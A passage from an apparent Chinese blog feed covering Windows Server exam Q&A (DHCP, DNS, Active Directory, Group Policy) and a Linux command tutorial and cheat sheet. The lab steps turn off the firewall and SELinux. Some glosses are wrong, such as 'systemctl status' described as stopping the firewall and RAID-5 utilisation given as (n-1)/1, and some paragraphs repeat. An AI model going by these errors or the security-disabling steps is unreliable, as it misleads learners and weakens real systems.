arg1，arg2…：将参数逐字发至远程ftp服务器，如：quote syst. \30. recv remote-file[local-file]：同get。 \31. rename[from][to]：更改远程主机文件名。 \32. rmdir dir-name：删除远程主机目录。 \33. send local-file[remote-file]：同put。 \34. status：显示当前ftp状态。 \35. trace：设置包跟踪 \36. type[type-name]：设置文件传输类型为type-name，缺省为ascii，如：type binary，设置二进制传输方式。 \37. verbose：同命令行的-v参数，即设置详尽报告方式，ftp服务器的所有响应都将显示给用户，缺省为on. \38. user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令， Dhcp服务器的租约过程以及更新租约时间 答：①客户端请求IP：发送discover广播包，源ip地址0.0.0.0 目标地址255.255.255.255 ②服务器端响应：发送offer包，源ip地址 192.168.1. 1 目标地址255.255.255.255 提供ip地址 192.168.1.12 ③客户端选择ip：发送request包，选择dhcp服务器192.168.1.1 源ip地址0.0.0.0 目标ip地址 255.255.255.255 租约期限 8 ④服务器确定租约 发送ACK确认 源地址192.168.1.1 目标地址255.255.255.255 租约时间的50%和87.5% Client获取IP地址后,重启计算机是如何续约地址的?如果ip已经不可用和可用服务器分别如何回应? 答：重启时客户端发送带有ip地址的request请求到服务器。如果ip可用，服务器发送ACK确认信息，ip继续使用；如果ip已经分配使用，服务器发送NACK，然后客户端重新发送DHCP Discover广播包 画图描述DNS的解析过程(标出递归查询和迭代查询) 答： DNS的正向解析和反向解析分别是什么意思 答：正向：由域名解析出ip 反向：由ip解析出域名 DNS服务器的分类,以及各自的特点 答：主要名称服务器：数据全 辅助名称服务器：数据是从主dns服务器中同步过来的，无法更改 Cache-Only（缓存）名称服务器：速度快，由其他服务器提供dns解析将数据存于告诉缓存中。缓存需要经常释放，否则主服务器改动之后就会解析错误 主控名称服务器：提供趋于数据复制的服务器 DNS辅助DNS同步区域文件需要注意什么 答：要在主DNS的属性区域传送中选中只允许到下列服务器，编辑辅助DNS的IP地址，然后在辅助DNS服务器上右键，从主DNS上传输即可 Web服务器的安装程序是什么 答：IIS web平台安装程序是一个非常酷的产品是一个很小的下载管理程序 - 微软Web平台安装程序（Microsoft Web Platform Installer），它极大地简化了web服务器和web开发设施的安装和配置。它可在Windows XP, Vista, Windows 7, Windows Server 2003 和 Windows Server 2008下工作。 IIs程序中默认文档的作用 答：直接访问网站首页 如何实现一台WEB服务器提供多个网站(三种方式) 答：相同IP不同端口 相同端口不同IP 相同端口 IP不同主机名 MBR分区方式的硬盘为什么只能划分四个主分区? 答：个分区信息占用16字节，总64字节。最多四个主分区 写出动态磁盘的优点 答：可扩展性：随时展开文件系统的管理空间 高读写性：动态磁盘中卷由多个硬盘组成，提高读写性 高可靠性：防止某个磁盘损坏造成数据丢失 写出动态磁盘卷的分类以及各自的特点(画表对比) 答： 分类 磁盘个数 每个磁盘提供的空间是否一致 可扩展性 读写性 容错 空间利用率 简单卷 1 —— 可 正常 无 100% 跨区卷 2-32 否 可 正常 无 100% 带区卷 2-32 是 否 最快 无 100% 镜像卷 只能2个 是 否 正常 有 50% Raid-5卷 3-32 是 否 较快 有 （n-1）/1 介绍一下以下相关域的概念 域： 活动目录的一种实现形式，属于活动目录中的核心管理单位，由域控制器和成员计算机组成 AD： 活动目录 DC： 域控制器 OU： 组织单位在容器中的称呼，可以存放一些对象和其他容器 功能级别： 域功能级别：限制域控制器的功能级别 林功能级别：限制林功能级别 组策略： 策略的集合，用于统一修改、设置程序 写出DC的基本条件 答：管理员权限；操作系统版本Windows Server 2003（Web版除外）、Windows Server 2008（Web版除外）、Windows Server 2008 R2（Web和Itanium版除外）；NTFS分区；静态ip；有足够可用的磁盘空间 写出加入域的基本条件 答：计算机IP地址设置正确，DNS配置正确；计算机能与域控制器互相连通 写出卸载域的注意事项 答：卸载域控制器之前，所有域控制器要相互联机，如果域内还有其他域控制器，则该计算机将会下降为成员服务器；如果该域控制器是域内最后一个域控制器，则该计算器降级为独立服务器，如果该域控制器担任了“全局编录”的角色，实施卸载前，先确认网络中还有其他域控制器承担这个角色，否则将影响用户的登录。 写出组策略的应用规则 答：策略继承与阻止：级容器可以继承或阻止应用其上级容器的GPO设置 策略累加与冲突：多个GPO设置可以累加或发生冲突被覆盖（如果多个组策略设置不冲突，则最终的有效策略是所有组策略设置的累加；如果多个组策略设置冲突，则后应用的组策略覆盖先应用的组策略。） 策略强制生效：使下级容器强制执行其上级容器的GPO设置 筛选：阻止一个容器内的用户或计算机应用其GPO设置 组策略应用顺序：LSDOU首先应用本地组策略，如果有站点组策略，则应用，接着应用域策略，最后应用OU上的策略（如果同一个OU上链接了多个GPO，则按照链接顺序从高到低逐个应用。） 写出漫游桌面实现的思路 答：在一个域环境当中，通过添加一个OU，将需要统一桌面的用户添加进去，给OU添加GPO，在用户设置中，找到桌面设置，Active Desktop选择已启用，禁止修改桌面选择已启用，统一桌面选择已启用（照片的路径设置为\IP\文件夹名\XX.jpg，该文件夹一定要设置共享），然后更新策略。这样OU内的所有用户就能实现漫游桌面。]]></content>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux常用命令]]></title>
    <url>%2F2019%2F08%2F10%2Flinux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[(1)网络测试命令: ping 192.168.1.1 //不会自动停,要Ctrl+C停止. Ctrl+l 清屏远程登录的方式:远程桌面/Telnet/SSH/;Telnet和SSH最大的区别是:传输数据包的时候是否进行加密.Telnet在传输过程中数据不加密—-明文传输;SSH在传输过程中对数据进行加密—-密文传输;ifconfig //查看所有网卡的信息ifconfig ens32 //只查看某一个网卡的信息vim 是linux中的一个编辑器,类似于windows中的记事本. 第一步:给Linux配置IP,并生效vim /etc/sysconfig/network-scripts/ifcfg-ens32 //编辑网卡配置文件vim —–&gt; i 可以进行编辑,编辑完成后—-&gt;Esc退出编辑—–&gt;保存:wqBOOTPROTO=static //获取IP的方式改为static静态IPADDR=192.168.100.1 //配置IPNETMASK=255.255.255.0 //配置子网掩码GATEWAY=192.168.100.254 //配置网关DNS=114.114.114.114ONBOOT=yes //启用网卡 第二步:重启,使配置生效service network restart //重新加载配置文件,生效ifconfig ens32 //检查网卡信息inet 192.168.100.1 netmask 255.255.255.0 broadcast 192.168.100.255 //第二行的IP信息,有才正常. 第三步:关闭Linux中的防火墙systemctl status firewalld //关闭防火墙1setenforce 0 //关闭selinuxgetenforce //查看selinux的状态 第四步:编辑vmware中NAT网卡的配置编辑—虚拟网卡编辑器—-修改网段为Linux中的网段—-NAT配置,修改网关为Linux中的网关.第五步:在真机中开启VMNET8,并配置为相同网段的IP,例如:192.168.100.100ping 192.168.100.1 测试网络连通性在真机安装可以远程管理的软件:putty/Xshell/SecureCRT 1.操作系统:内核(kernel)和外壳(shell) shell:命令解释器,把用户输入的一些指令解析成kernel可以识别的”语言”. (1)Linux分为内核和外壳. 安德鲁教授教学使用的Minix; Linus发布的是Linux的内核; (2)20世纪80年代的时候，1984年Richard Stallman 发起了“自由软件运动”。 项目名称叫做“GNU（GNU’s not unix）计划”，目的：就是开发一个开源免费的类Unix操作系统。 FSF（Free Software Foundation）自由软件基金会，为了防止这个项目的软件被商业化，就有了GPL。 GPL（通用公共许可证：GNU General Public License）核心思想：每个人有权获得，修改和重新发布源代码的权利，但是要把具体的改动发布出来 2.Linux基本命令:(1)网络测试命令:​ ping 192.168.1.1 //不会自动停,要Ctrl+C停止.​ Ctrl+l 清屏​ Ctrl+u 清除整行的内容(光标到行首)​ ctrl+K 清除整行到行尾​ Esc+. 表示调用上一次命令的最后参数​​ 远程登录的方式:远程桌面/Telnet/SSH/; Telnet和SSH最大的区别是:传输数据包的时候是否进行加密. Telnet在传输过程中数据不加密----明文传输; SSH在传输过程中对数据进行加密----密文传输; ifconfig //查看所有网卡的信息 ifconfig ens32 //只查看某一个网卡的信息 vim 是linux中的一个编辑器,类似于windows中的记事本. 第一步:给Linux配置IP,并生效 vim /etc/sysconfig/network-scripts/ifcfg-ens32 //编辑网卡配置文件 vim -----&gt; i 可以进行编辑,编辑完成后----&gt;Esc退出编辑-----&gt;保存:wq BOOTPROTO=static //获取IP的方式改为static静态 IPADDR=192.168.100.1 //配置IP NETMASK=255.255.255.0 //配置子网掩码 GATEWAY=192.168.100.254 //配置网关 DNS=114.114.114.114 ONBOOT=yes //启用网卡 第二步:重启,使配置生效 service network restart //重新加载配置文件,生效 ifconfig ens32 //检查网卡信息 inet 192.168.100.1 netmask 255.255.255.0 broadcast 192.168.100.255 //第二行的IP信息,有才正常. 第三步:关闭Linux中的防火墙 systemctl status firewalld //关闭防火墙1 setenforce 0 //关闭selinux getenforce //查看selinux的状态​​ 第四步:编辑vmware中NAT网卡的配置​ 编辑—虚拟网卡编辑器—-修改网段为Linux中的网段—-NAT配置,修改网关为Linux中的网关.​​ 第五步:在真机中开启VMNET8,并配置为相同网段的IP,例如:192.168.100.100​ ping 192.168.100.1 测试网络连通性​ 在真机安装可以远程管理的软件:putty/Xshell/SecureCRT​​ 注意:修改网卡配置需要管理员权限,切换用户的命令. su - root //su - 用来切换用户,后边加用户名.​ 第六步:如果想上网,就要能DNS解析 vim /etc/resolv.conf 3.基础命令:(1)系统类查看命令: [root@localhost ~]# uname -r //查看内核版本 3.10.0-862.el7.x86_64 其中3是主版本号,除非内核发生结构性变化,一般不会修改 10是次版本号, 0代表对次版本的修改次数; 862是对系统的修订次数. [root@localhost ~]# uname -m //查看系统位数 x86_64 [root@localhost ~]# uname -a //查看内核详细信息,包括主机名/系统版本号/时间等 [root@localhost ~]# cat /etc/redhat-release //查看系统版本 CentOS Linux release 7.5.1804 (Core) [root@localhost ]# pwd //root表示当前的用户名,localhost表示主机名, ~ 表示家目录. /root [haha@localhost ~]$ pwd //表示家目录,如果是普通用户,那么家目录在/home/用户名 /home/haha (2)开关机,重启的命令 重启:reboot == init 6 ==shutdown -r 关闭:poweroff == shutdown -P //关闭系统并关闭电源. (3)时间相关:​ [root@localhost ~]# date //查看当前时间​ 2019年 08月 09日 星期五 14:48:58 CST​ [root@localhost ~]# date -s “20180101 15:00:00” //修改时间​ 2018年 01月 01日 星期一 15:00:00 CST​ [root@localhost ~]#​ [root@localhost ~]# hwclock –show //查看硬件时间​ 2019年08月09日 星期五 14时50分21秒 -1.029828 秒​ [root@localhost ~]# hwclock –set –date=”2019/01/01 14:51:00” //设置硬件时间​ [root@localhost ~]# date +%F //显示年月日​ 2019-08-09​ [root@localhost ~]# date +%T //显示时分秒​ 14:52:16​ [root@localhost ~]# date +%w //显示星期​ 5 (4)查看当前登录用户: [root@localhost ~]# whoami //我是谁 root [root@localhost ~]# who //查看当前登录用户 root pts/0 2019-08-09 00:59 (:0) //图形化界面的”终端窗口”—本地登录 root :0 2019-08-09 00:59 (:0) //图形化界面登录—本地登录 haha pts/2 2019-08-09 14:57 (192.168.100.100) //远程登录,从192.168.100.100登录的 修改主机名: [root@localhost ~]# hostnamectl set-hostname CentOS74.系统文件路径相关问题(1)关于路径; 从/开始的路径,叫做绝对路径. 从当前路径开始的路径,叫做相对路径. (2)Linux中的系统路径:在Linux中,一切皆文件(包括目录和文件).​ /boot 存放系统的引导文件​ /bin 存放普通用户的一些命令​ /dev 设备文件存储路径​ /etc 存放系统中的配置文件*****​ /home 普通用户的家目录​ /root root的家目录​ /lib和/lib64是库文件​ /media 目录：默认可移动设备的挂载路径，比如挂载U盘、光盘和移动硬盘（之前用/mnt目录挂载U盘）。​ Linux中默认情况下,必须有一个/ 根分区,如果是其他外部设备是没有办法被操作系统识别的.如果Linux系统要识别某个设备,就要指定一个目录来”挂载”​ /mnt 目录：临时挂载点。​ /opt 目录：第三方应用程序安装位置。​ /tmp 目录：系统运行的临时文件存放路径。用户都有访问权限。​ /usr 目录：Universal Shared，read-only data；默认软件的安装目录，全局共享只读数据。很重要。​ /usr/local ：本地层级结构，系统安装后一般是空的。取代/opt成为第三方应用程序的安装位置。​ /var 目录：Variable Data Files可变数据的层级目录，存放经常变换数据的目录（比如日志）​ /var/log ：日志目录 (2)关于路径;​ ln -s /etc/sysconfig/network-scripts/ifcfg-ens32 wangka //给系统的网卡配置文件创建一个快捷方式,新的文件名为wangka​ pwd //显示当前路径​ cd .. //切换到上级目录​ cd - //切换到上次访问的目录 (3)目录的相关操作:​ pwd //显示当前路径​ cd .. //切换到上级目录​ cd . //一个点是当前路径​ cd - //切换到上次访问的目录​ mkdir /test //创建一个目录 cd /test //进入这个目录 mkdir -p test1/test2/test3/test4 //递归创建,同时创建多层目录 rm -rf test1/ //删除文件夹,-r表示递归删除;-f强制,没有提示信息.=====&gt;rm -rf的参数,慎用!!!(4)文件相关操作:​ touch aaa.txt //用touch的时候如果没有文件就直接创建;如果有,就更新文件的时间戳.​ echo this is bbb2.txt &gt;&gt; bbb.txt //向文件追加内容​ cat bbb.txt //查看文件内容​ echo this is bbb2.txt &gt; bbb.txt //用现在的内容直接”替换”原来的内容​ echo date +%F &gt;&gt;aaa.txt //echo 表示向文件写入内容,如果内容为命令,可以用反引号来引用(``)1前边的符号. 查看文件的命令: cat bbb.txt //显示文件的整个内容 head -1 bbb.txt //查看文件第一行的内容 tail -1 bbb.txt //查看文件最后一行的内容 ls --help | more //查看ls的帮助信息,并分页显示(more是只能向下翻页) ls --help | less //查看ls的帮助信息,并分页显示(less更智能,可以向上/向下翻页) 删除普通文件: rm aaa.txt (5)ls 列出当前路径的文件​ ls -l /test //以长格式显示/test目录的信息;如果后边不加路径,默认是当前路径下的文件​ ls -lh aaa.txt //-h 是以人类易读的方式显示文件大小; ​ ls -al //-a 显示所有文件,包括隐藏文件 1.使用root和haha(或者之前创建的其他用户)同时登陆系统,查看当前有几个登陆用户; 2.查看系统的时间,并修改为2019年10月1日; 3.在/下创建一个目录/test ; 4.在/test下创建几个文件,分别是time.txt date.txt week.txt 把时分秒的执行结果写入到time.txt; 把年月日的结果写入到date.txt; 把星期几的结果写入到week.txt; 5.使用cat命令检查,上边3个文件是否正常; 6.在/test下创建多级子目录,层级关系为/test/test11/test22/test33; 在/test/test11文件里创建11.txt文件,写入自己的名字和一首诗; 使用命令查看写入的结果; 7.查看系统内核版本和位数结果写入到/test/kernel.txt; 8.查看当前系统版本,追加到/test/kernel.txt; 9.查看当前用户的身份和用户名. 10.修改主机名为自己的名字 系统信息** arch 显示机器的处理器架构 uname -m 显示机器的处理器架构 uname -r 显示正在使用的内核版本 dmidecode -q 显示硬件系统部件 - (SMBIOS / DMI) hdparm -i /dev/hda 罗列一个磁盘的架构特性 hdparm -tT /dev/sda 在磁盘上执行测试性读取操作 cat /proc/cpuinfo 显示CPU info的信息 cat /proc/interrupts 显示中断 cat /proc/meminfo 校验内存使用 cat /proc/swaps 显示哪些swap被使用 cat /proc/version 显示内核的版本 cat /proc/net/dev 显示网络适配器及统计 cat /proc/mounts 显示已加载的文件系统 lspci -tv 罗列 PCI 设备 lsusb -tv 显示 USB 设备 date 显示系统日期 cal 2007 显示2007年的日历表 date 041217002007.00 设置日期和时间 - 月日时分年.秒 clock -w 将时间修改保存到 BIOS 关机 (系统的关机、重启以及登出 )shutdown -h now 关闭系统 init 0 关闭系统 telinit 0 关闭系统 shutdown -h hours:minutes &amp; 按预定时间关闭系统 shutdown -c 取消按预定时间关闭系统 shutdown -r now 重启 reboot 重启 logout 注销 -——————————————————————————————— 文件和目录cd /home 进入 ‘/ home’ 目录’ cd .. 返回上一级目录 cd ../.. 返回上两级目录 cd 进入个人的主目录 cd ~user1 进入个人的主目录 cd - 返回上次所在的目录 pwd 显示工作路径 ls 查看目录中的文件 ls -F 查看目录中的文件 ls -l 显示文件和目录的详细资料 ls -a 显示隐藏文件 ls [0-9] 显示包含数字的文件名和目录名 tree 显示文件和目录由根目录开始的树形结构 lstree 显示文件和目录由根目录开始的树形结构 mkdir dir1 创建一个叫做 ‘dir1’ 的目录’ mkdir dir1 dir2 同时创建两个目录 mkdir -p /tmp/dir1/dir2 创建一个目录树 rm -f file1 删除一个叫做 ‘file1’ 的文件’ rmdir dir1 删除一个叫做 ‘dir1’ 的目录’ rm -rf dir1 删除一个叫做 ‘dir1’ 的目录并同时删除其内容 rm -rf dir1 dir2 同时删除两个目录及它们的内容 mv dir1 new_dir 重命名/移动 一个目录 cp file1 file2 复制一个文件 cp dir/* . 复制一个目录下的所有文件到当前工作目录 cp -a /tmp/dir1 . 复制一个目录到当前工作目录 cp -a dir1 dir2 复制一个目录 ln -s file1 lnk1 创建一个指向文件或目录的软链接 ln file1 lnk1 创建一个指向文件或目录的物理链接 touch -t 0712250000 file1 修改一个文件或目录的时间戳 - (YYMMDDhhmm) file file1 outputs the mime type of the file as text iconv -l 列出已知的编码 iconv -f fromEncoding -t toEncoding inputFile &gt; outputFile creates a new from the given input file by assuming it is encoded in fromEncoding and converting it to toEncoding. find . -maxdepth 1 -name *.jpg -print -exec convert “{}” -resize 80x60 “thumbs/{}” ; batch resize files in the current directory and send them to a thumbnails directory (requires convert from Imagemagick) -——————————————————————————————— 文件搜索find / -name file1 从 ‘/‘ 开始进入根文件系统搜索文件和目录 find / -user user1 搜索属于用户 ‘user1’ 的文件和目录 find /home/user1 -name *.bin 在目录 ‘/ home/user1’ 中搜索带有’.bin’ 结尾的文件 find /usr/bin -type f -atime +100 搜索在过去100天内未被使用过的执行文件 find /usr/bin -type f -mtime -10 搜索在10天内被创建或者修改过的文件 find / -name *.rpm -exec chmod 755 ‘{}’ ; 搜索以 ‘.rpm’ 结尾的文件并定义其权限 find / -xdev -name *.rpm 搜索以 ‘.rpm’ 结尾的文件，忽略光驱、捷盘等可移动设备 locate *.ps 寻找以 ‘.ps’ 结尾的文件 - 先运行 ‘updatedb’ 命令 whereis halt 显示一个二进制文件、源码或man的位置 which halt 显示一个二进制文件或可执行文件的完整路径 -——————————————————————————————— 挂载一个文件系统mount /dev/hda2 /mnt/hda2 挂载一个叫做hda2的盘 - 确定目录 ‘/ mnt/hda2’ 已经存在 umount /dev/hda2 卸载一个叫做hda2的盘 - 先从挂载点 ‘/ mnt/hda2’ 退出 fuser -km /mnt/hda2 当设备繁忙时强制卸载 umount -n /mnt/hda2 运行卸载操作而不写入 /etc/mtab 文件- 当文件为只读或当磁盘写满时非常有用 mount /dev/fd0 /mnt/floppy 挂载一个软盘 mount /dev/cdrom /mnt/cdrom 挂载一个cdrom或dvdrom mount /dev/hdc /mnt/cdrecorder 挂载一个cdrw或dvdrom mount /dev/hdb /mnt/cdrecorder 挂载一个cdrw或dvdrom mount -o loop file.iso /mnt/cdrom 挂载一个文件或ISO镜像文件 mount -t vfat /dev/hda5 /mnt/hda5 挂载一个Windows FAT32文件系统 mount /dev/sda1 /mnt/usbdisk 挂载一个usb 捷盘或闪存设备 mount -t smbfs -o username=user,password=pass //WinClient/share /mnt/share 挂载一个windows网络共享 -——————————————————————————————— 磁盘空间df -h 显示已经挂载的分区列表 ls -lSr |more 以尺寸大小排列文件和目录 du -sh dir1 估算目录 ‘dir1’ 已经使用的磁盘空间’ du -sk * | sort -rn 以容量大小为依据依次显示文件和目录的大小 rpm -q -a –qf ‘%10{SIZE}t%{NAME}n’ | sort -k1,1n 以大小为依据依次显示已安装的rpm包所使用的空间 (fedora, redhat类系统) dpkg-query -W -f=’${Installed-Size;10}t${Package}n’ | sort -k1,1n 以大小为依据显示已安装的deb包所使用的空间 (ubuntu, debian类系统) -——————————————————————————————— 用户和群组groupadd group_name 创建一个新用户组 groupdel group_name 删除一个用户组 groupmod -n new_group_name old_group_name 重命名一个用户组 useradd -c “Name Surname “ -g admin -d /home/user1 -s /bin/bash user1 创建一个属于 “admin” 用户组的用户 useradd user1 创建一个新用户 userdel -r user1 删除一个用户 ( ‘-r’ 排除主目录) usermod -c “User FTP” -g system -d /ftp/user1 -s /bin/nologin user1 修改用户属性 passwd 修改口令 passwd user1 修改一个用户的口令 (只允许root执行) chage -E 2005-12-31 user1 设置用户口令的失效期限 pwck 检查 ‘/etc/passwd’ 的文件格式和语法修正以及存在的用户 grpck 检查 ‘/etc/passwd’ 的文件格式和语法修正以及存在的群组 newgrp group_name 登陆进一个新的群组以改变新创建文件的预设群组 -——————————————————————————————— 文件的权限 - 使用 “+” 设置权限，使用 “-“ 用于取消ls -lh 显示权限 ls /tmp | pr -T5 -W$COLUMNS 将终端划分成5栏显示 chmod ugo+rwx directory1 设置目录的所有人(u)、群组(g)以及其他人(o)以读（r ）、写(w)和执行(x)的权限 chmod go-rwx directory1 删除群组(g)与其他人(o)对目录的读写执行权限 chown user1 file1 改变一个文件的所有人属性 chown -R user1 directory1 改变一个目录的所有人属性并同时改变改目录下所有文件的属性 chgrp group1 file1 改变文件的群组 chown user1:group1 file1 改变一个文件的所有人和群组属性 find / -perm -u+s 罗列一个系统中所有使用了SUID控制的文件 chmod u+s /bin/file1 设置一个二进制文件的 SUID 位 - 运行该文件的用户也被赋予和所有者同样的权限 chmod u-s /bin/file1 禁用一个二进制文件的 SUID位 chmod g+s /home/public 设置一个目录的SGID 位 - 类似SUID ，不过这是针对目录的 chmod g-s /home/public 禁用一个目录的 SGID 位 chmod o+t /home/public 设置一个文件的 STIKY 位 - 只允许合法所有人删除文件 chmod o-t /home/public 禁用一个目录的 STIKY 位 -——————————————————————————————— 文件的特殊属性 - 使用 “+” 设置权限，使用 “-“ 用于取消chattr +a file1 只允许以追加方式读写文件 chattr +c file1 允许这个文件能被内核自动压缩/解压 chattr +d file1 在进行文件系统备份时，dump程序将忽略这个文件 chattr +i file1 设置成不可变的文件，不能被删除、修改、重命名或者链接 chattr +s file1 允许一个文件被安全地删除 chattr +S file1 一旦应用程序对这个文件执行了写操作，使系统立刻把修改的结果写到磁盘 chattr +u file1 若文件被删除，系统会允许你在以后恢复这个被删除的文件 lsattr 显示特殊的属性 -——————————————————————————————— 打包和压缩文件bunzip2 file1.bz2 解压一个叫做 ‘file1.bz2’的文件 bzip2 file1 压缩一个叫做 ‘file1’ 的文件 gunzip file1.gz 解压一个叫做 ‘file1.gz’的文件 gzip file1 压缩一个叫做 ‘file1’的文件 gzip -9 file1 最大程度压缩 rar a file1.rar test_file 创建一个叫做 ‘file1.rar’ 的包 rar a file1.rar file1 file2 dir1 同时压缩 ‘file1’, ‘file2’ 以及目录 ‘dir1’ rar x file1.rar 解压rar包 unrar x file1.rar 解压rar包 tar -cvf archive.tar file1 创建一个非压缩的 tarball tar -cvf archive.tar file1 file2 dir1 创建一个包含了 ‘file1’, ‘file2’ 以及 ‘dir1’的档案文件 tar -tf archive.tar 显示一个包中的内容 tar -xvf archive.tar 释放一个包 tar -xvf archive.tar -C /tmp 将压缩包释放到 /tmp目录下 tar -cvfj archive.tar.bz2 dir1 创建一个bzip2格式的压缩包 tar -jxvf archive.tar.bz2 解压一个bzip2格式的压缩包 tar -cvfz archive.tar.gz dir1 创建一个gzip格式的压缩包 tar -zxvf archive.tar.gz 解压一个gzip格式的压缩包 zip file1.zip file1 创建一个zip格式的压缩包 zip -r file1.zip file1 file2 dir1 将几个文件和目录同时压缩成一个zip格式的压缩包 unzip file1.zip 解压一个zip格式压缩包 -——————————————————————————————— RPM 包 - （Fedora, Redhat及类似系统）rpm -ivh package.rpm 安装一个rpm包 rpm -ivh –nodeeps package.rpm 安装一个rpm包而忽略依赖关系警告 rpm -U package.rpm 更新一个rpm包但不改变其配置文件 rpm -F package.rpm 更新一个确定已经安装的rpm包 rpm -e package_name.rpm 删除一个rpm包 rpm -qa 显示系统中所有已经安装的rpm包 rpm -qa | grep httpd 显示所有名称中包含 “httpd” 字样的rpm包 rpm -qi package_name 获取一个已安装包的特殊信息 rpm -qg “System Environment/Daemons” 显示一个组件的rpm包 rpm -ql package_name 显示一个已经安装的rpm包提供的文件列表 rpm -qc package_name 显示一个已经安装的rpm包提供的配置文件列表 rpm -q package_name –whatrequires 显示与一个rpm包存在依赖关系的列表 rpm -q package_name –whatprovides 显示一个rpm包所占的体积 rpm -q package_name –scripts 显示在安装/删除期间所执行的脚本l rpm -q package_name –changelog 显示一个rpm包的修改历史 rpm -qf /etc/httpd/conf/httpd.conf 确认所给的文件由哪个rpm包所提供 rpm -qp package.rpm -l 显示由一个尚未安装的rpm包提供的文件列表 rpm –import /media/cdrom/RPM-GPG-KEY 导入公钥数字证书 rpm –checksig package.rpm 确认一个rpm包的完整性 rpm -qa gpg-pubkey 确认已安装的所有rpm包的完整性 rpm -V package_name 检查文件尺寸、 许可、类型、所有者、群组、MD5检查以及最后修改时间 rpm -Va 检查系统中所有已安装的rpm包- 小心使用 rpm -Vp package.rpm 确认一个rpm包还未安装 rpm2cpio package.rpm | cpio –extract –make-directories bin 从一个rpm包运行可执行文件 rpm -ivh /usr/src/redhat/RPMS/arch/package.rpm 从一个rpm源码安装一个构建好的包 rpmbuild –rebuild package_name.src.rpm 从一个rpm源码构建一个 rpm 包 YUM 软件包升级器 - （Fedora, RedHat及类似系统）yum install package_name 下载并安装一个rpm包 yum localinstall package_name.rpm 将安装一个rpm包，使用你自己的软件仓库为你解决所有依赖关系 yum update package_name.rpm 更新当前系统中所有安装的rpm包 yum update package_name 更新一个rpm包 yum remove package_name 删除一个rpm包 yum list 列出当前系统中安装的所有包 yum search package_name 在rpm仓库中搜寻软件包 yum clean packages 清理rpm缓存删除下载的包 yum clean headers 删除所有头文件 yum clean all 删除所有缓存的包和头文件 DEB 包 (Debian, Ubuntu 以及类似系统)dpkg -i package.deb 安装/更新一个 deb 包 dpkg -r package_name 从系统删除一个 deb 包 dpkg -l 显示系统中所有已经安装的 deb 包 dpkg -l | grep httpd 显示所有名称中包含 “httpd” 字样的deb包 dpkg -s package_name 获得已经安装在系统中一个特殊包的信息 dpkg -L package_name 显示系统中已经安装的一个deb包所提供的文件列表 dpkg –contents package.deb 显示尚未安装的一个包所提供的文件列表 dpkg -S /bin/ping 确认所给的文件由哪个deb包提供 APT 软件工具 (Debian, Ubuntu 以及类似系统)apt-get install package_name 安装/更新一个 deb 包 apt-cdrom install package_name 从光盘安装/更新一个 deb 包 apt-get update 升级列表中的软件包 apt-get upgrade 升级所有已安装的软件 apt-get remove package_name 从系统删除一个deb包 apt-get check 确认依赖的软件仓库正确 apt-get clean 从下载的软件包中清理缓存 apt-cache search searched-package 返回包含所要搜索字符串的软件包名称 查看文件内容cat file1 从第一个字节开始正向查看文件的内容 tac file1 从最后一行开始反向查看一个文件的内容 more file1 查看一个长文件的内容 less file1 类似于 ‘more’ 命令，但是它允许在文件中和正向操作一样的反向操作 head -2 file1 查看一个文件的前两行 tail -2 file1 查看一个文件的最后两行 tail -f /var/log/messages 实时查看被添加到一个文件中的内容 文本处理cat file1 file2 … | command &lt;&gt; file1_in.txt_or_file1_out.txt general syntax for text manipulation using PIPE, STDIN and STDOUT cat file1 | command( sed, grep, awk, grep, etc…) &gt; result.txt 合并一个文件的详细说明文本，并将简介写入一个新文件中 cat file1 | command( sed, grep, awk, grep, etc…) &gt;&gt; result.txt 合并一个文件的详细说明文本，并将简介写入一个已有的文件中 grep Aug /var/log/messages 在文件 ‘/var/log/messages’中查找关键词”Aug” grep ^Aug /var/log/messages 在文件 ‘/var/log/messages’中查找以”Aug”开始的词汇 grep [0-9] /var/log/messages 选择 ‘/var/log/messages’ 文件中所有包含数字的行 grep Aug -R /var/log/* 在目录 ‘/var/log’ 及随后的目录中搜索字符串”Aug” sed ‘s/stringa1/stringa2/g’ example.txt 将example.txt文件中的 “string1” 替换成 “string2” sed ‘/ *#/d; /^$/d’ example.txt 从example.txt文件中删除所有注释和空白行 echo ‘esempio’ | tr ‘[:lower:]’ ‘[:upper:]’ 合并上下单元格内容 sed -e ‘1d’ result.txt 从文件example.txt 中排除第一行 sed -n ‘/stringa1/p’ 查看只包含词汇 “string1”的行 sed -e ‘s/ *$//‘ example.txt 删除每一行最后的空白字符 sed -e ‘s/stringa1//g’ example.txt 从文档中只删除词汇 “string1” 并保留剩余全部 sed -n ‘1,5p;5q’ example.txt 查看从第一行到第5行内容 sed -n ‘5p;5q’ example.txt 查看第5行 sed -e ‘s/00*/0/g’ example.txt 用单个零替换多个零 cat -n file1 标示文件的行数 cat example.txt | awk ‘NR%2==1’ 删除example.txt文件中的所有偶数行 echo a b c | awk ‘{print $1}’ 查看一行第一栏 echo a b c | awk ‘{print $1,$3}’ 查看一行的第一和第三栏 paste file1 file2 合并两个文件或两栏的内容 paste -d ‘+’ file1 file2 合并两个文件或两栏的内容，中间用”+”区分 sort file1 file2 排序两个文件的内容 sort file1 file2 | uniq 取出两个文件的并集(重复的行只保留一份) sort file1 file2 | uniq -u 删除交集，留下其他的行 sort file1 file2 | uniq -d 取出两个文件的交集(只留下同时存在于两个文件中的文件) comm -1 file1 file2 比较两个文件的内容只删除 ‘file1’ 所包含的内容 comm -2 file1 file2 比较两个文件的内容只删除 ‘file2’ 所包含的内容 comm -3 file1 file2 比较两个文件的内容只删除两个文件共有的部分 字符设置和文件格式转换dos2unix filedos.txt fileunix.txt 将一个文本文件的格式从MSDOS转换成UNIX unix2dos fileunix.txt filedos.txt 将一个文本文件的格式从UNIX转换成MSDOS recode ..HTML &lt; page.txt &gt; page.html 将一个文本文件转换成html recode -l | more 显示所有允许的转换格式 文件系统分析badblocks -v /dev/hda1 检查磁盘hda1上的坏磁块 fsck /dev/hda1 修复/检查hda1磁盘上linux文件系统的完整性 fsck.ext2 /dev/hda1 修复/检查hda1磁盘上ext2文件系统的完整性 e2fsck /dev/hda1 修复/检查hda1磁盘上ext2文件系统的完整性 e2fsck -j /dev/hda1 修复/检查hda1磁盘上ext3文件系统的完整性 fsck.ext3 /dev/hda1 修复/检查hda1磁盘上ext3文件系统的完整性 fsck.vfat /dev/hda1 修复/检查hda1磁盘上fat文件系统的完整性 fsck.msdos /dev/hda1 修复/检查hda1磁盘上dos文件系统的完整性 